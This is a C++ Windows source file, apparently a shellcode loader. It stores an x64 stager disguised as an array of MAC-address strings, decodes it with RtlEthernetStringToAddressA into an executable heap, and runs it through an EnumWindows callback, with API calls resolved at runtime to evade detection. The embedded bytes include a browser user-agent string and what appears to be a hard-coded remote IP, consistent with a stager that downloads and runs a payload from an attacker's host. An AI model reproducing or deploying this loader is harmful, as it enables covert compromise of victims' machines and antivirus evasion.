#include <Windows.h>
#include <iostream>
#include <ip2string.h>
#pragma comment(lib, "Ntdll.lib")


//将转换后的shellcode（shellcode-> mac）
const char* mac_[] =
{
    "FC-48-83-E4-F0-E8", "C8-00-00-00-41-51", "41-50-52-51-56-48", "31-D2-65-48-8B-52", "60-48-8B-52-18-48", "8B-52-20-48-8B-72", "50-48-0F-B7-4A-4A", "4D-31-C9-48-31-C0", "AC-3C-61-7C-02-2C", "20-41-C1-C9-0D-41", "01-C1-E2-ED-52-41", "51-48-8B-52-20-8B", "42-3C-48-01-D0-66", "81-78-18-0B-02-75", "72-8B-80-88-00-00", "00-48-85-C0-74-67", "48-01-D0-50-8B-48", "18-44-8B-40-20-49", "01-D0-E3-56-48-FF", "C9-41-8B-34-88-48", "01-D6-4D-31-C9-48", "31-C0-AC-41-C1-C9", "0D-41-01-C1-38-E0", "75-F1-4C-03-4C-24", "08-45-39-D1-75-D8", "58-44-8B-40-24-49", "01-D0-66-41-8B-0C", "48-44-8B-40-1C-49", "01-D0-41-8B-04-88", "48-01-D0-41-58-41", "58-5E-59-5A-41-58", "41-59-41-5A-48-83", "EC-20-41-52-FF-E0", "58-41-59-5A-48-8B", "12-E9-4F-FF-FF-FF", "5D-6A-00-49-BE-77", "69-6E-69-6E-65-74", "00-41-56-49-89-E6", "4C-89-F1-41-BA-4C", "77-26-07-FF-D5-48", "31-C9-48-31-D2-4D", "31-C0-4D-31-C9-41", "50-41-50-41-BA-3A", "56-79-A7-FF-D5-E9", "93-00-00-00-5A-48", "89-C1-41-B8-BB-01", "00-00-4D-31-C9-41", "51-41-51-6A-03-41", "51-41-BA-57-89-9F", "C6-FF-D5-EB-79-5B", "48-89-C1-48-31-D2", "49-89-D8-4D-31-C9", "52-68-00-32-C0-84", "52-52-41-BA-EB-55", "2E-3B-FF-D5-48-89", "C6-48-83-C3-50-6A", "0A-5F-48-89-F1-BA", "1F-00-00-00-6A-00", "68-80-33-00-00-49", "89-E0-41-B9-04-00", "00-00-41-BA-75-46", "9E-86-FF-D5-48-89", "F1-48-89-DA-49-C7", "C0-FF-FF-FF-FF-4D", "31-C9-52-52-41-BA", "2D-06-18-7B-FF-D5", "85-C0-0F-85-9D-01", "00-00-48-FF-CF-0F", "84-8C-01-00-00-EB", "B3-E9-E4-01-00-00", "E8-82-FF-FF-FF-2F", "4C-70-58-49-00-DF", "E6-55-0B-C7-0B-19", "4D-B4-74-8F-06-89", "8A-62-17-8F-C2-8A", "C8-21-A0-1B-2E-3F", "F9-CF-4B-32-72-E2", "E9-74-2D-6C-32-F5", "D2-0E-CA-B1-8A-0A", "C6-F2-F8-EC-E0-5C", "80-5E-86-62-24-8D", "0A-10-51-D6-DA-AF", "84-CE-8A-8A-A7-FA", "78-18-97-BC-B0-50", "00-55-73-65-72-2D", "41-67-65-6E-74-3A", "20-4D-6F-7A-69-6C", "6C-61-2F-35-2E-30", "20-28-63-6F-6D-70", "61-74-69-62-6C-65", "3B-20-4D-53-49-45", "20-31-30-2E-30-3B", "20-57-69-6E-64-6F", "77-73-20-4E-54-20", "36-2E-32-3B-20-57", "4F-57-36-34-3B-20", "54-72-69-64-65-6E", "74-2F-36-2E-30-3B", "20-4D-41-47-57-4A", "53-29-0D-0A-00-CE", "75-8D-FB-7D-DB-D6", "05-1B-CB-C5-45-FA", "7E-21-5F-E5-C3-0B", "88-F3-22-F4-2B-F7", "55-FA-5C-6E-BD-DE", "31-99-BB-EF-1A-1E", "EE-B9-3A-B1-56-BC", "B1-46-56-80-B3-F1", "7B-88-93-A2-76-7A", "59-95-4A-67-06-2D", "CB-36-B2-51-85-83", "B8-FC-59-57-E8-5B", "21-57-A2-1F-C0-5F", "03-10-E1-85-04-B0", "60-E6-E7-A7-98-52", "32-40-44-47-DB-61", "B7-11-42-5A-F2-20", "06-B7-C6-9A-26-ED", "5E-9A-FD-87-9E-73", "66-A9-E9-F5-95-C7", "74-63-4D-2D-AB-13", "00-F5-E6-80-00-F4", "69-C8-55-DE-E6-9D", "77-2C-B7-1C-AF-22", "E9-A7-FC-1C-37-E7", "E9-D6-D1-8E-FE-30", "AE-21-9F-DD-E9-DC", "62-BC-FD-F2-68-93", "EE-61-4C-E1-39-0E", "0C-C6-37-A3-E3-A4", "27-B1-72-EC-B0-F3", "FB-9C-79-79-F5-60", "77-73-CD-C5-73-61", "01-09-B5-C3-75-70", "A9-B1-4E-A2-00-41", "BE-F0-B5-A2-56-FF", "D5-48-31-C9-BA-00", "00-40-00-41-B8-00", "10-00-00-41-B9-40", "00-00-00-41-BA-58", "A4-53-E5-FF-D5-48", "93-53-53-48-89-E7", "48-89-F1-48-89-DA", "41-B8-00-20-00-00", "49-89-F9-41-BA-12", "96-89-E2-FF-D5-48", "83-C4-20-85-C0-74", "B6-66-8B-07-48-01", "C3-85-C0-75-D7-58", "58-58-48-05-00-00", "00-00-50-C3-E8-7F", "FD-FF-FF-31-2E-31", "35-2E-38-30-2E-31", "30-32-00-49-96-02", "D2-00-00-00-00-00"

};


typedef HANDLE(WINAPI* ImportHeapCreate)(
    _In_ DWORD flOptions,
    _In_ SIZE_T dwInitialSize,
    _In_ SIZE_T dwMaximumSize
    );

typedef LPVOID(WINAPI* ImportHeapAlloc)(
    _In_ HANDLE hHeap,
    _In_ DWORD dwFlags,
    _In_ SIZE_T dwBytes
    );

typedef NTSTATUS(NTAPI* ImportRtlEthernetStringToAddressA)(
    _In_ PCSTR S,
    _Out_ PCSTR* Terminator,
    _Out_ DL_EUI48* Addr
    );

typedef BOOL(WINAPI* ImportEnumWindows)(
    _In_ WNDENUMPROC lpEnumFunc,
    _In_ LPARAM lParam
    );



int main()
{


    HMODULE hModule0 = LoadLibraryA("kernel32.dll");
    ImportHeapCreate MyHeapCreate = (ImportHeapCreate)GetProcAddress(hModule0, "HeapCreate");
    ImportHeapAlloc MyHeapAlloc = (ImportHeapAlloc)GetProcAddress(hModule0, "HeapAlloc");
    
    HMODULE hModule1 = LoadLibraryA("ntdll.dll");
    ImportRtlEthernetStringToAddressA MyRtlEthernetStringToAddressA = (ImportRtlEthernetStringToAddressA)GetProcAddress(hModule1, "RtlEthernetStringToAddressA");
    
    HMODULE hModule2 = LoadLibraryA("USER32.dll");
    ImportEnumWindows MyEnumWindows = (ImportEnumWindows)GetProcAddress(hModule2, "EnumWindows");


    HANDLE hc = MyHeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    void* ha = MyHeapAlloc(hc, 0, 0x100000);
    DWORD_PTR hptr = (DWORD_PTR)ha;
    int elems = sizeof(mac_) / sizeof(mac_[0]);
    PCSTR Terminator = "";

    for (int i = 0; i < elems; i++) {

        if (MyRtlEthernetStringToAddressA(mac_[i], &Terminator, (DL_EUI48*)hptr) == STATUS_INVALID_PARAMETER)
        {
            printf("ERROR!");
            return 0;
        }
        hptr += 6;
    }

    MyEnumWindows((WNDENUMPROC)ha, 0);
    CloseHandle(ha);
    return 0;
}
